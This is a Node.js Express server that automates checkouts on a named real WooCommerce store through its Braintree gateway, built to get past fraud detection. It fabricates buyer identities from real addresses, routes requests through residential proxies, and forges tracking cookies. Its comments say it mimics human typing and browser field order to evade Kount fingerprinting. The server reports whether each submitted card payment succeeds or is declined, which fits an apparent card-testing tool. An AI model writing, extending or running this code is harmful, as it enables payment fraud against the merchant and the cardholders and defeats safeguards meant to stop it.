const express = require("express");
const path    = require("path");
const crypto  = require("crypto");
const { randomIdentity, warmPool } = require("./server/identity");

const app  = express();
const PORT = process.env.PORT || 3000;
warmPool(); // pre-fetch address pool at startup

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Request logger
app.use((req, _res, next) => { console.log(`→ ${req.method} ${req.url}`); next(); });

// ── Optional residential proxy (PROXY_URL) ────────────────────────────────────
let proxyDispatcher = null;
if (process.env.PROXY_URL) {
  try {
    const { ProxyAgent } = require("undici");
    proxyDispatcher = new ProxyAgent(process.env.PROXY_URL);
    console.log("Upstream proxy enabled via PROXY_URL");
  } catch (e) {
    console.error("Failed to init proxy:", e.message);
  }
}
function pfetch(url, opts = {}) {
  return proxyDispatcher ? fetch(url, { ...opts, dispatcher: proxyDispatcher }) : fetch(url, opts);
}

// ── US-only enforcement ──────────────────────────────────────────────────────
const ALLOWED_COUNTRY = "US";

// ── Braintree: fetch gateway configuration ───────────────────────────────────
// The client_token (JWT) authorizes us to call Braintree's configuration API.
// We extract merchantId from the JWT payload and fetch /client_api/v1/configuration.
async function fetchBraintreeConfig(clientToken) {
  if (!clientToken) return "";
  try {
    // Decode JWT payload (middle part) to get merchantId
    const parts = clientToken.split(".");
    let merchantId = null, env = "production";
    if (parts.length === 3) {
      const payload = JSON.parse(Buffer.from(parts[1], "base64").toString("utf8"));
      merchantId = payload.merchant || payload.sub;
    } else {
      // Old format: base64 JSON
      const j = JSON.parse(Buffer.from(clientToken, "base64").toString("utf8"));
      merchantId = j.merchantId;
      env = j.environment || env;
      if (j.clientApiUrl && !merchantId) {
        const m = j.clientApiUrl.match(/merchants\/([^/]+)/);
        if (m) merchantId = m[1];
      }
    }
    if (!merchantId) { console.error("[bt-config] no merchantId in token"); return ""; }

    const cfgUrl = `https://api.braintreegateway.com/merchants/${merchantId}/client_api/v1/configuration?configVersion=3`;
    const r = await pfetch(cfgUrl, {
      headers: {
        Accept: "application/json",
        "Braintree-Version": "2018-05-10",
        Authorization: `Bearer ${clientToken}`,
      }
    });
    if (!r.ok) {
      const body = await r.text().catch(() => "");
      console.error(`[bt-config] HTTP ${r.status} body=${body.slice(0,200)}`);
      return "";
    }
    const j = await r.json();
    console.log(`[bt-config] OK merchantId=${merchantId} keys=${Object.keys(j).length}`);
    return JSON.stringify(j);
  } catch (e) {
    console.error("[bt-config] failed:", e.message);
    return "";
  }
}

// ── In-memory session store (15-min TTL) ─────────────────────────────────────
const sessions   = new Map();
const SESSION_TTL = 15 * 60 * 1000;

function makeId()       { return crypto.randomBytes(24).toString("hex"); }
function cleanSessions(){ const now = Date.now(); for (const [k,v] of sessions) if (now - v.createdAt > SESSION_TTL) sessions.delete(k); }

// ── WooCommerce constants ─────────────────────────────────────────────────────
const WC_BASE        = "https://unclejimswormfarm.com";
const CHECKOUT_PAGE  = `${WC_BASE}/checkouts/check/`;
const CHECKOUT_AJAX  = `${WC_BASE}/?wc-ajax=checkout&wfacp_id=1226456&wfacp_is_checkout_override=yes`;
const CART_AJAX      = `${WC_BASE}/?wc-ajax=add_to_cart`;
const PRODUCT_ID     = "773932";
const WFACP_POST_ID  = "1226456";

// Headers must match the HAR exactly — Braintree/Kount fingerprints these.
// Real browser sends Sec-CH-UA hints + Sec-Fetch metadata + Priority.
const UA = {
  "User-Agent":        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
  "Accept-Language":   "en-US,en;q=0.9",
  "Accept":            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Encoding":   "gzip, deflate, br, zstd",
  "sec-ch-ua":         '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
  "sec-ch-ua-mobile":  "?1",
  "sec-ch-ua-platform":'"Android"',
  "Upgrade-Insecure-Requests": "1",
  "Priority":          "u=0, i",
};

// Headers used for AJAX (XHR) calls — same client hints, but Sec-Fetch is "cors/empty".
const AJAX_HEADERS = {
  "User-Agent":        UA["User-Agent"],
  "Accept":            "application/json, text/javascript, */*; q=0.01",
  "Accept-Language":   UA["Accept-Language"],
  "Accept-Encoding":   UA["Accept-Encoding"],
  "sec-ch-ua":         UA["sec-ch-ua"],
  "sec-ch-ua-mobile":  UA["sec-ch-ua-mobile"],
  "sec-ch-ua-platform":UA["sec-ch-ua-platform"],
  "Sec-Fetch-Dest":    "empty",
  "Sec-Fetch-Mode":    "cors",
  "Sec-Fetch-Site":    "same-origin",
  "Priority":          "u=1, i",
  "X-Requested-With":  "XMLHttpRequest",
};

// Build a "returning visitor" cookie jar so the Cookie header has tracking
// cookies a real, repeat user would carry. WP/WC + Kount fingerprint tracks
// these — a request with only a cart cookie reads as a fresh bot.
// (Values are deterministic-looking but randomised per session.)
function seedTrackingCookies() {
  const rand = () => Math.random().toString(36).slice(2, 12);
  const num  = (n) => Math.floor(Math.random() * Math.pow(10, n));
  const nowIso = new Date().toISOString().slice(0, 10);
  const ua = encodeURIComponent("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36");
  const url = "https%3A%2F%2Funclejimswormfarm.com%2F";
  const sbjs = `typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29`;
  const sbjsAdd = `fd%3D${nowIso}+07%3A34%3A01%7C%7C%7Cep%3D${url}%7C%7C%7Crf%3D%28none%29`;
  const parts = [
    `sbjs_migrations=1418474375998%3D1`,
    `sbjs_current_add=${sbjsAdd}`,
    `sbjs_first_add=${sbjsAdd}`,
    `sbjs_current=${sbjs}`,
    `sbjs_first=${sbjs}`,
    `sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3D${ua}`,
    `sbjs_session=pgs%3D4%7C%7C%7Ccpg%3D${url}checkout%2F`,
    `cookieyes-consent=consentid:${rand()}${rand()},consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes`,
    `_gcl_au=1.1.${num(10)}.${Math.floor(Date.now()/1000)}`,
    `_ga=GA1.1.${num(10)}.${Math.floor(Date.now()/1000)}`,
    `_ga_DNHZTZ9VDF=GS2.1.s${Math.floor(Date.now()/1000)}$o1$g0$t${Math.floor(Date.now()/1000)}$j60$l0$h0`,
    `wordpress_test_cookie=WP%20Cookie%20check`,
  ];
  return parts.join("; ");
}

// Local time string for Asia/Calcutta (matches wfacp_timezone) — used for session_start_time.
function nowLocalIST() {
  const opts = { timeZone: "Asia/Calcutta", year:"numeric", month:"2-digit", day:"2-digit", hour:"2-digit", minute:"2-digit", second:"2-digit", hour12:false };
  const parts = new Intl.DateTimeFormat("en-CA", opts).formatToParts(new Date());
  const get = (t) => parts.find(p => p.type === t).value;
  return `${get("year")}-${get("month")}-${get("day")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

function extractCookies(res) {
  const raw = res.headers.raw?.()?.["set-cookie"] || res.headers.getSetCookie?.() || [];
  return raw.map(c => c.split(";")[0]).join("; ");
}
function mergeCookies(a, b) {
  const map = new Map();
  for (const part of `${a}; ${b}`.split(";")) {
    const t = part.trim(); if (!t) continue;
    const eq = t.indexOf("="); if (eq === -1) continue;
    map.set(t.slice(0, eq).trim(), t);
  }
  return [...map.values()].join("; ");
}
function extractNonce(html) {
  return (html.match(/["']woocommerce-process-checkout-nonce["']\s*:\s*["']([a-f0-9]+)["']/i) ||
          html.match(/woocommerce-process-checkout-nonce["']?\s+value=["']([a-f0-9]+)["']/i) || [])[1] || null;
}
function extractUpdateOrderReviewNonce(html) {
  return (html.match(/["']update[_-]order[_-]review[_-]nonce["']\s*:\s*["']([a-f0-9]+)["']/i) ||
          html.match(/update[_-]order[_-]review[_-]nonce["']?\s+value=["']([a-f0-9]+)["']/i) ||
          html.match(/wc_checkout_params[^}]*update_order_review_nonce["']?\s*:\s*["']([a-f0-9]+)["']/i) ||
          [])[1] || null;
}
// Funnel Kit (BWFAN) abandoned-cart wpnonce — used by bwfan_insert_abandoned_cart
function extractBwfanNonce(html) {
  return (html.match(/bwfan[_-]?(?:ac[_-]?)?nonce["']?\s*:\s*["']([a-f0-9]+)["']/i) ||
          html.match(/["']bwfan[_-]?wpnonce["']\s*:\s*["']([a-f0-9]+)["']/i) ||
          html.match(/wfacp[_-]?ajax[_-]?nonce["']?\s*:\s*["']([a-f0-9]+)["']/i) ||
          html.match(/name=["']bwfan[^"']*nonce["']\s+value=["']([a-f0-9]+)["']/i) ||
          [])[1] || null;
}
function extractToken(html) {
  for (const p of [
    /wc_braintree_client_token\s*=\s*\[["']([A-Za-z0-9+/=._-]{40,})["']/,
    /client_token["']\s*:\s*["']([A-Za-z0-9+/=._-]{40,})["']/,
    /clientToken["']\s*:\s*["']([A-Za-z0-9+/=._-]{40,})["']/,
    /authorization["']\s*:\s*["']([A-Za-z0-9+/=._-]{40,})["']/,
  ]) { const m = html.match(p); if (m) return m[1]; }
  return null;
}

// ── GET /api/pay/session ──────────────────────────────────────────────────────
// ── Random identity endpoint (real OSM address + name + email + NYC phone) ──
app.get("/api/identity/random", async (_req, res) => {
  try {
    const id = await randomIdentity();
    console.log(`[identity] → ${id.billing_first_name} ${id.billing_last_name} ${id.billing_postcode} (pool=${id._poolSize})`);
    res.json(id);
  } catch (e) {
    console.error(`[identity] failed: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

app.get("/api/pay/session", async (req, res) => {
  cleanSessions();
  try {
    console.log("[session] step 1: GET checkout page");
    const p1   = await pfetch(CHECKOUT_PAGE, { headers: UA, redirect: "follow" });
    console.log(`[session] step 1 status=${p1.status}`);
    let cookies = extractCookies(p1);
    const h1    = await p1.text();
    const nonce1 = extractNonce(h1);
    const token1 = extractToken(h1);
    console.log(`[session] step 1 html=${h1.length} bytes nonce=${!!nonce1} token=${!!token1}`);

    console.log("[session] step 2: add to cart");
    const cart = await pfetch(CART_AJAX, {
      method: "POST",
      headers: { ...AJAX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", Origin: WC_BASE, Referer: CHECKOUT_PAGE, Cookie: cookies },
      body: `success_message=&product_sku=&product_id=${PRODUCT_ID}&quantity=1`,
    });
    console.log(`[session] step 2 status=${cart.status}`);
    cookies = mergeCookies(cookies, extractCookies(cart));
    let bwfanCartId = "";
    try { const j = await cart.json(); const m = JSON.stringify(j).match(/bwfan_cart_id['":\s]+(\d+)/); if (m) bwfanCartId = m[1]; } catch {}
    console.log(`[session] step 2 cartId=${bwfanCartId || "(none)"}`);

    console.log("[session] step 3: GET checkout page (with cart)");
    const p2   = await pfetch(CHECKOUT_PAGE, { headers: { ...UA, Cookie: cookies }, redirect: "follow" });
    console.log(`[session] step 3 status=${p2.status}`);
    cookies    = mergeCookies(cookies, extractCookies(p2));
    const h2   = await p2.text();
    const nonce = extractNonce(h2) || nonce1;
    const token = extractToken(h2) || token1;
    const reviewNonce = extractUpdateOrderReviewNonce(h2) || extractUpdateOrderReviewNonce(h1) || "";
    const bwfanNonce  = extractBwfanNonce(h2) || extractBwfanNonce(h1) || "";
    console.log(`[session] step 3 html=${h2.length} bytes nonce=${!!nonce} token=${!!token} reviewNonce=${reviewNonce?"yes":"NO"} bwfanNonce=${bwfanNonce?"yes":"NO"}`);

    // Pre-fetch Braintree gateway config (the missing cc_config_data piece)
    const configData = await fetchBraintreeConfig(token);

    // Try harder to find bwfan_cart_id from page HTML if cart endpoint didn't have it
    if (!bwfanCartId) {
      const cm = h2.match(/bwfan[_-]cart[_-]id["':\s=]+["']?(\d+)/i);
      if (cm) bwfanCartId = cm[1];
    }

    // Scrape dynamic Elementor block hidden fields (e.g. bd79828=0, ec52b7f=0)
    // These appear in page as <input type="hidden" name="abc1234" value="0" />
    const dynamicFields = {};
    const reHidden = /<input[^>]+type=["']hidden["'][^>]+name=["']([a-f0-9]{7})["'][^>]+value=["'](\d+)["']/gi;
    let m;
    while ((m = reHidden.exec(h2)) !== null) dynamicFields[m[1]] = m[2];

    const sessionId = makeId();
    sessions.set(sessionId, { cookies, nonce, reviewNonce, bwfanNonce, bwfanCartId, configData, dynamicFields, createdAt: Date.now(), used: false });

    console.log(`[session] OK sessionId=${sessionId.slice(0,8)}… cartId=${bwfanCartId||"(none)"} configData=${configData?configData.length+"b":"EMPTY"} dynamicFields=${Object.keys(dynamicFields).length}`);
    res.json({ sessionId, clientToken: token, nonceFound: !!nonce, tokenFound: !!token });
  } catch (err) {
    console.error(`[session] FAIL: ${err.message}`);
    console.error(err.stack);
    res.status(502).json({ error: "Session init failed: " + err.message });
  }
});

// ── POST /api/pay/checkout ────────────────────────────────────────────────────
app.post("/api/pay/checkout", async (req, res) => {
  const { sessionId, paymentNonce, deviceData="", configData: clientConfigData="", billing_first_name="", billing_last_name="", billing_email="", billing_phone="", billing_address_1="", billing_city="", billing_postcode="", billing_state="" } = req.body;
  const billing_country = ALLOWED_COUNTRY; // hard-locked to US
  if (!sessionId || !paymentNonce) return res.status(400).json({ error: "sessionId and paymentNonce required" });
  if (!/^\d{5}(-\d{4})?$/.test(billing_postcode)) return res.status(400).json({ error: "Please enter a valid US ZIP code (5 digits)." });
  if (!/^[A-Z]{2}$/.test(billing_state.toUpperCase())) return res.status(400).json({ error: "Please enter a valid US state code (e.g. NY, CA, TX)." });

  const s = sessions.get(sessionId);
  if (!s)       return res.status(400).json({ error: "Session expired. Please refresh." });
  if (s.used)   return res.status(400).json({ error: "Session already used." });
  if (Date.now() - s.createdAt > SESSION_TTL) { sessions.delete(sessionId); return res.status(400).json({ error: "Session expired. Please refresh." }); }

  const { cookies, nonce, reviewNonce, bwfanNonce, bwfanCartId, dynamicFields = {} } = s;
  // Prefer config_data sent by the browser (Braintree SDK already authed it correctly);
  // fall back to whatever the server managed to fetch.
  const configData = clientConfigData || s.configData || "";
  console.log(`[checkout] configData source=${clientConfigData ? "browser" : (s.configData ? "server" : "NONE")} length=${configData.length}`);

  // Helper: pause to simulate a human typing between AJAX calls.
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const jitter = (min, max) => Math.floor(min + Math.random() * (max - min));

  // ── STEP A: simulate a user filling the address field-by-field. HAR shows
  //    8 update_order_review calls as fields are entered. Each call warms up
  //    the server cart with progressively more of the address, mirroring real
  //    typing. Without this cadence, Kount sees "form-dump" = bot.
  if (reviewNonce) {
    // Progressive address states — empty → partial → full. Mirrors a user typing.
    const stages = [
      { country: billing_country, state: "", postcode: "", city: "", address: "" },
      { country: billing_country, state: billing_state, postcode: "", city: "", address: "" },
      { country: billing_country, state: billing_state, postcode: billing_postcode, city: "", address: "" },
      { country: billing_country, state: billing_state, postcode: billing_postcode, city: billing_city, address: "" },
      { country: billing_country, state: billing_state, postcode: billing_postcode, city: billing_city, address: billing_address_1 },
      { country: billing_country, state: billing_state, postcode: billing_postcode, city: billing_city, address: billing_address_1 },
      { country: billing_country, state: billing_state, postcode: billing_postcode, city: billing_city, address: billing_address_1 },
      { country: billing_country, state: billing_state, postcode: billing_postcode, city: billing_city, address: billing_address_1 },
    ];
    for (let i = 0; i < stages.length; i++) {
      const st = stages[i];
      try {
        const reviewBody = new URLSearchParams({
          security:         reviewNonce,
          payment_method:   "braintree_cc",
          country:          st.country,
          state:            st.state,
          postcode:         st.postcode,
          city:             st.city,
          address:          st.address,
          address_2:        "",
          s_country:        st.country,
          s_state:          st.state,
          s_postcode:       st.postcode,
          s_city:           st.city,
          s_address:        st.address,
          s_address_2:      "",
          has_full_address: st.address ? "true" : "false",
          post_data:        `_wfacp_post_id=${WFACP_POST_ID}&billing_email=${encodeURIComponent(billing_email)}`,
        }).toString();
        const uorUrl = `${WC_BASE}/?wc-ajax=update_order_review&wfacp_id=${WFACP_POST_ID}&wfacp_is_checkout_override=yes`;
        const uor = await pfetch(uorUrl, { method: "POST", headers: { ...AJAX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", Referer: `${WC_BASE}/checkout/`, Origin: WC_BASE, Cookie: s.cookies || cookies }, body: reviewBody });
        if (i === 0 || i === stages.length - 1) console.log(`[checkout] update_order_review #${i+1}/${stages.length} status=${uor.status}`);
        s.cookies = mergeCookies(s.cookies || cookies, extractCookies(uor));
      } catch (e) {
        console.warn(`[checkout] update_order_review #${i+1} failed (non-fatal): ${e.message}`);
      }
      if (i < stages.length - 1) await sleep(jitter(150, 400));
    }
  } else {
    console.warn("[checkout] no reviewNonce — skipping update_order_review (CHECKOUT MAY FAIL)");
  }

  // ── STEP B: register customer in Funnel Kit abandoned-cart table.
  //    HAR fires this 14 times — once per field edit, with progressively more
  //    data each time. We mirror that pattern so the customer record evolves
  //    naturally instead of appearing as a single bot-dump.
  if (bwfanNonce) {
    // 14 progressive states matching HAR (email → name → address → ... → phone)
    const bwfanStates = [
      { last_edit: "createaccount",        first: "", last: "", country: "", addr1: "", city: "", state: "", zip: "", phone: "" },
      { last_edit: "billing_first_name",   first: billing_first_name, last: "", country: "", addr1: "", city: "", state: "", zip: "", phone: "" },
      { last_edit: "billing_last_name",    first: billing_first_name, last: billing_last_name, country: "", addr1: "", city: "", state: "", zip: "", phone: "" },
      { last_edit: "billing_country",      first: billing_first_name, last: billing_last_name, country: billing_country, addr1: "", city: "", state: "", zip: "", phone: "" },
      { last_edit: "billing_address_1",    first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: "", state: "", zip: "", phone: "" },
      { last_edit: "billing_city",         first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: "", zip: "", phone: "" },
      { last_edit: "billing_state",        first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: "", phone: "" },
      { last_edit: "billing_postcode",     first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: billing_postcode, phone: "" },
      { last_edit: "billing_postcode",     first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: billing_postcode, phone: "" },
      { last_edit: "billing_phone",        first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: billing_postcode, phone: billing_phone },
      { last_edit: "billing_phone",        first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: billing_postcode, phone: billing_phone },
      { last_edit: "billing_phone",        first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: billing_postcode, phone: billing_phone },
      { last_edit: "billing_phone",        first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: billing_postcode, phone: billing_phone },
      { last_edit: "billing_phone",        first: billing_first_name, last: billing_last_name, country: billing_country, addr1: billing_address_1, city: billing_city, state: billing_state, zip: billing_postcode, phone: billing_phone },
    ];
    const bwfanUrl = `${WC_BASE}/?wc-ajax=bwfan_insert_abandoned_cart&wfacp_id=${WFACP_POST_ID}&wfacp_is_checkout_override=yes`;
    for (let i = 0; i < bwfanStates.length; i++) {
      const st = bwfanStates[i];
      try {
        const bwfanBody = new URLSearchParams({
          email: i === 0 ? billing_email.split("@")[0] + "@" : billing_email, // partial like HAR's first call
          action: "bwfan_insert_abandoned_cart",
          "checkout_fields_data[billing_same_as_shipping]": st.first ? "0" : "",
          "checkout_fields_data[ship_to_different_address]": st.first ? "1" : "",
          "checkout_fields_data[shipping_postcode]":   st.zip,
          "checkout_fields_data[shipping_state]":      st.state,
          "checkout_fields_data[shipping_city]":       st.city,
          "checkout_fields_data[shipping_address_2]":  "",
          "checkout_fields_data[shipping_address_1]":  st.addr1,
          "checkout_fields_data[shipping_country]":    st.country,
          "checkout_fields_data[shipping_last_name]":  "",
          "checkout_fields_data[shipping_first_name]": "",
          "checkout_fields_data[billing_postcode]":    st.zip,
          "checkout_fields_data[billing_state]":       st.state,
          "checkout_fields_data[billing_city]":        st.city,
          "checkout_fields_data[billing_address_2]":   "",
          "checkout_fields_data[billing_address_1]":   st.addr1,
          "checkout_fields_data[billing_country]":     st.country,
          "checkout_fields_data[billing_phone]":       st.phone,
          "checkout_fields_data[billing_last_name]":   st.last,
          "checkout_fields_data[billing_first_name]":  st.first,
          last_edit_field: st.last_edit,
          current_step: "single_step",
          current_page_id: "32",
          timezone: "Asia/Calcutta",
          aerocheckout_page_id: WFACP_POST_ID,
          pushengage_token: "",
          _wpnonce: bwfanNonce,
        }).toString();
        const bwf = await pfetch(bwfanUrl, { method: "POST", headers: { ...AJAX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", Referer: `${WC_BASE}/checkout/`, Origin: WC_BASE, Cookie: s.cookies || cookies }, body: bwfanBody });
        if (i === 0 || i === bwfanStates.length - 1) console.log(`[checkout] bwfan #${i+1}/${bwfanStates.length} status=${bwf.status}`);
        // Capture cart_id from first response
        if (i <= 1 && !s.bwfanCartId) {
          try { const bj = await bwf.json(); const m = JSON.stringify(bj).match(/bwfan_cart_id['":\s]+(\d+)/); if (m) s.bwfanCartId = m[1]; } catch {}
        }
        s.cookies = mergeCookies(s.cookies || cookies, extractCookies(bwf));
      } catch (e) {
        console.warn(`[checkout] bwfan #${i+1} failed (non-fatal): ${e.message}`);
      }
      if (i < bwfanStates.length - 1) await sleep(jitter(80, 250));
    }
  } else {
    console.warn("[checkout] no bwfanNonce — skipping abandoned cart register");
  }

  const nowStr = nowLocalIST(); // local Asia/Calcutta time, matches wfacp_timezone
  const cartId = s.bwfanCartId || bwfanCartId;

  // Build fields in EXACT HAR order (real browser DOM order). Field order
  // is a known bot-detection signal — Kount fingerprints serialization order.
  const orderedFields = [
    ["_wfacp_post_id", WFACP_POST_ID],
    ["wfacp_cart_hash", ""],
    ["wfacp_has_active_multi_checkout", ""],
    ["wfacp_source", `${WC_BASE}/checkouts/check/`],
    ["product_switcher_need_refresh", "1"],
    ["wfacp_cart_contains_subscription", "0"],
    ["wfacp_exchange_keys", JSON.stringify({ pre_built: {}, elementor: { wfacp_form: "6bd44386", wfacp_form_summary: "122408a" } })],
    ["wfacp_input_hidden_data", "{}"],
    ["wfacp_input_phone_field", JSON.stringify({ billing: { code: "1", number: billing_phone, hidden: "no" }, shipping: { code: "", number: "", hidden: "" } })],
    ["wfacp_timezone", "Asia/Calcutta"],
    ["wc_order_attribution_source_type", "typein"],
    ["wc_order_attribution_referrer", "(none)"],
    ["wc_order_attribution_utm_campaign", "(none)"],
    ["wc_order_attribution_utm_source", "(direct)"],
    ["wc_order_attribution_utm_medium", "(none)"],
    ["wc_order_attribution_utm_content", "(none)"],
    ["wc_order_attribution_utm_id", "(none)"],
    ["wc_order_attribution_utm_term", "(none)"],
    ["wc_order_attribution_utm_source_platform", "(none)"],
    ["wc_order_attribution_utm_creative_format", "(none)"],
    ["wc_order_attribution_utm_marketing_tactic", "(none)"],
    ["wc_order_attribution_session_entry", `${WC_BASE}/cart/`],
    ["wc_order_attribution_session_start_time", nowStr],
    ["wc_order_attribution_session_pages", "4"],
    ["wc_order_attribution_session_count", "1"],
    ["wc_order_attribution_user_agent", UA["User-Agent"]],
    ["wfacp_billing_same_as_shipping", "0"],
    ["wfacp_billing_address_present", "yes"],
    ["wfob_input_hidden_data", "{}"],
    ["wfob_input_bump_shown_ids", "1227685"],
    ["wfob_input_bump_global_data", ""],
    ["billing_email", billing_email],
    ["bwfan_cart_id", cartId || ""],
    ["account_username", ""],
    ["account_password", ""],
    ["billing_first_name", billing_first_name],
    ["billing_last_name", billing_last_name],
    ["shipping_address_1", billing_address_1],
    ["shipping_city", billing_city],
    ["shipping_postcode", billing_postcode],
    ["shipping_country", billing_country],
    ["shipping_state", billing_state],
    ["billing_address_1", billing_address_1],
    ["billing_city", billing_city],
    ["billing_postcode", billing_postcode],
    ["billing_country", billing_country],
    ["billing_state", billing_state],
    ["billing_phone", billing_phone],
    ["order_comments", ""],
    ["wfacp_coupon_field", ""],
    // dynamic Elementor block IDs (5 fields, all "0") in HAR order
    ...Object.entries(dynamicFields),
    ["payment_method", "braintree_cc"],
    ["braintree_cc_nonce_key", paymentNonce],
    ["braintree_cc_device_data", deviceData],
    ["braintree_cc_3ds_nonce_key", ""],
    ["braintree_cc_config_data", configData || ""],
    ["stripe_applepay_token_key", ""],
    ["stripe_applepay_payment_intent_key", ""],
    ["stripe_googlepay_token_key", ""],
    ["stripe_googlepay_payment_intent_key", ""],
    ["stripe_payment_request_token_key", ""],
    ["stripe_payment_request_payment_intent_key", ""],
    ["ppcp_paypal_order_id", ""],
    ["ppcp_payment_token", ""],
    ["ppcp_billing_token", ""],
    ["bwfan_user_consent", "1"],
    ["woocommerce-process-checkout-nonce", nonce || ""],
    ["_wp_http_referer", `/?wc-ajax=update_order_review&wfacp_id=${WFACP_POST_ID}&wfacp_is_checkout_override=yes`],
    ["wfacp_subscription_gifting", ""],
    ["shipping_first_name", billing_first_name],
    ["shipping_last_name", billing_last_name],
    ["billing_address_2", ""],
    ["shipping_address_2", ""],
    ["ship_to_different_address", "on"],
  ];

  const params = new URLSearchParams();
  for (const [k, v] of orderedFields) params.append(k, v);

  // ── HAR-style capture for diffing against the working browser HAR ──
  const finalHeaders = { ...AJAX_HEADERS, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", Referer: `${WC_BASE}/checkout/`, Origin: WC_BASE, Cookie: s.cookies || cookies };
  const captureEntry = {
    startedDateTime: new Date().toISOString(),
    request: {
      method: "POST",
      url: CHECKOUT_AJAX,
      headers: Object.entries(finalHeaders).map(([name, value]) => ({ name, value: String(value) })),
      cookies: (finalHeaders.Cookie || "").split("; ").filter(Boolean).map(c => { const [n, ...rest] = c.split("="); return { name: n, value: rest.join("=") }; }),
      postData: { mimeType: "application/x-www-form-urlencoded; charset=UTF-8", text: params.toString(), params: orderedFields.map(([name, value]) => ({ name, value: String(value) })) },
    },
    response: null,
    timings: { send: 0, wait: 0, receive: 0 },
  };

  try {
    console.log(`[checkout] submitting ${billing_email} ${billing_state} ${billing_postcode} deviceData=${deviceData ? deviceData.length+"b" : "EMPTY"}`);
    const t0 = Date.now();
    const r    = await pfetch(CHECKOUT_AJAX, { method: "POST", headers: finalHeaders, body: params.toString() });
    captureEntry.timings.wait = Date.now() - t0;
    console.log(`[checkout] upstream status=${r.status}`);
    const raw  = await r.text();
    captureEntry.response = {
      status: r.status,
      statusText: r.statusText || "",
      headers: Array.from(r.headers.entries ? r.headers.entries() : Object.entries(r.headers || {})).map(([name, value]) => ({ name, value: String(value) })),
      content: { size: raw.length, mimeType: r.headers.get?.("content-type") || "application/json", text: raw },
    };

    // Persist as a HAR 1.2 file
    try {
      const fs = await import("fs");
      const har = { log: { version: "1.2", creator: { name: "checkout-server", version: "1.0" }, entries: [captureEntry] } };
      fs.writeFileSync("/tmp/last_checkout.har", JSON.stringify(har, null, 2));
      console.log("[checkout] HAR saved → /tmp/last_checkout.har (download via GET /last-checkout.har)");
    } catch (e) { console.warn(`[checkout] HAR save failed: ${e.message}`); }

    let data; try { data = JSON.parse(raw); } catch { return res.status(502).json({ error: "Upstream returned non-JSON. See logs." }); }
    if (data.result === "success") {
      s.used = true;
      const m = (data.redirect || "").match(/order_id=(\d+)/);
      console.log(`[checkout] SUCCESS order=${m?m[1]:"?"}`);
      return res.json({ success: true, orderId: m ? m[1] : null, redirect: data.redirect });
    }
    const errText = (typeof data.messages === "string" ? data.messages.replace(/<[^>]+>/g, "").trim() : data.message) || "Payment declined.";
    console.log(`[checkout] DECLINED: ${errText}`);
    return res.status(402).json({ success: false, error: errText });
  } catch (err) {
    console.error(`[checkout] FAIL: ${err.message}`);
    console.error(err.stack);
    res.status(502).json({ error: "Checkout failed: " + err.message });
  }
});

// ── HAR download endpoint — fetch the last checkout attempt for diffing ──
app.get("/last-checkout.har", async (req, res) => {
  try {
    const fs = await import("fs");
    if (!fs.existsSync("/tmp/last_checkout.har")) return res.status(404).send("No HAR captured yet. Run a checkout first.");
    res.setHeader("Content-Type", "application/json");
    res.setHeader("Content-Disposition", 'attachment; filename="last_checkout.har"');
    res.send(fs.readFileSync("/tmp/last_checkout.har"));
  } catch (e) { res.status(500).send("Error: " + e.message); }
});

// ── Serve checkout page ───────────────────────────────────────────────────────
app.get("/", (req, res) => res.sendFile(path.join(__dirname, "public", "checkout.html")));
app.get("/checkout", (req, res) => res.sendFile(path.join(__dirname, "public", "checkout.html")));

app.listen(PORT, "0.0.0.0", () => console.log(`Checkout server on :${PORT}`));
